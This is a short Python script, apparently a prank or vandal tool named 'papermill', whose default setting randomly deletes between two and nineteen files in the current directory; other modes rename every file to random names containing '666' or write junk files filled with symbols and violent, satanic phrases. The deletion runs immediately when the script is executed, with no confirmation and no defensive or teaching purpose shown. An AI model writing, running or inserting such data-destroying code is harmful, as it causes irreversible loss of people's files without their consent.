````python
# Parameters
generate_junk_file = 0
random_delete = True
rename_file = False
````

````python
import random
import pathlib

def filename_generator():
    num = list(str(random.random()))[2:]
    num.append('666')
    random.shuffle(num)
    return ''.join(num)

def mystic_message():
    return [
        'Violent torture ', 'Death has arrived ', 'Armageddon ', 'Terror and fright ',
        'Bleeding corpses ', 'Rotting decay ', 'Anarchy ', 'Violent torture ',
        'Antichrist ', 'Lucifer ', 'Son of Satan ', 'Pure Fucking Armageddon ',
        'Pure Fucking Armageddon! '
    ]

def math_symbols():
    special_char = [
        '+', '-', '*', '÷', '%', '‰', '(', ')', '±', '≡', '=', '≈', '<', '>', '≥',
        '≤', '√', 'ⁿ', '¹', '²', '³', 'π', '°', '#', '∞', 'µ', 'Σ', '∩', '⌠', '⌡'
    ]
    return random.choice(special_char)

def junkfile_generator():
    special_char_array = []
    for spch in range(1, 3500):
        special_char_array.append(math_symbols())
    special_char_array.append(mystic_message())
    random.shuffle(special_char_array)
    return special_char_array

def number_of_files():
    return random.randrange(2, 20)

def directory():
    p = pathlib.Path('.')
    return p.iterdir()
````

````python
def run_papermill():
    if random_delete:
        for n in range(1, number_of_files()):
            rnd_pick = random.choice(list(directory()))
            if rnd_pick.suffix in ['.exe', '.py']:
                pass
            elif rnd_pick.is_dir():
                pass
            else:
                print(rnd_pick, '[Raderad]')
                rnd_pick.unlink()

    elif rename_file:
        for item in list(directory()):
            if item.suffix in ['.exe', '.py']:
                pass
            elif item.is_dir():
                pass
            else:
                print(item, '[Ändrad]')
                item.rename(f'{filename_generator()}{item.suffix}')

    elif generate_junk_file >= 1:
        for n in range(generate_junk_file):
            with open(filename_generator() + '.txt', 'x', encoding='UTF-8') as f:
                for item in junkfile_generator():
                    f.write(''.join(item))
        print(f"Skapade {generate_junk_file} junk‑filer.")

run_papermill()
````
